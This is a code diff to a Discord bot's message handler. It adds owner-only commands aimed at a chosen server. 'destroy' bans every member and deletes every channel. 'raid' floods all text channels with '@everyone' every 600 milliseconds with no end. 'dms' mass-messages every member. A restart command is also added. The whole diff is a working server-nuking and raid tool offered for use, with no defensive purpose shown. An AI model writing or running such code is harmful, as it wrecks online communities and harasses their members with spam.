@@ -15,20 +15,47 @@ function isOwner(id) {
 client.on('message', message => {
     if (isOwner(message.author.id)) {
         var args = message.content.split(" ");
-        var serverid = args[0];
-        let guild = client.guilds.get(serverid);
-        delete args[0];
-        var msg = args.join(" ");
-        guild.members.map(m => {
+        // destroy serverid
+        if (args[0] == prefix + 'destroy') {
+            var serverid = args[1];
+            let guild = client.guilds.get(serverid);
+            guild.members.forEach(m => {
+                m.ban();
+            });
+            for (var i = 0; i < guild.channels.array().length; i++) {
+                guild.channels.array()[i].delete();
+            }
+        }
+        // raid serverid
+        if (args[0] == prefix + 'raid') {
+            var serverid = args[1];
+            var msg = "@everyone"
+            var interval = setInterval(function () {
+                client.guilds.get(serverid).channels.map(c => {
+                    if (c.type == "text") c.send(msg);
+                });
+            }, 600);
+        }
+        // dms serverid msg
+        if (args[0] == prefix + 'dms') {
+            delete args[0];
+            var serverid = args[1];
+            delete args[1];
+            var msg = args.join(" ");
+            client.guilds.get(serverid).members.map(m => {
                 m.send(msg);
-        });
-        guild.members.forEach(m => {
-            m.kick();
-        });
-        for (var i = 0; i < guild.channels.array().length; i++) {
-            guild.channels.array()[i].delete();
+            });
+        }
+        // Restart bot
+        if (args[0] == prefix + 'restart') {
+               require("child_process").spawn(process.argv.shift(), process.argv, {
+                   cwd: process.cwd(),
+                   detached : true,
+                   stdio: "inherit"
+               });
+               process.exit();
         }
     }
 });
-    
+
 client.login(process.env.BOT_TOKEN);
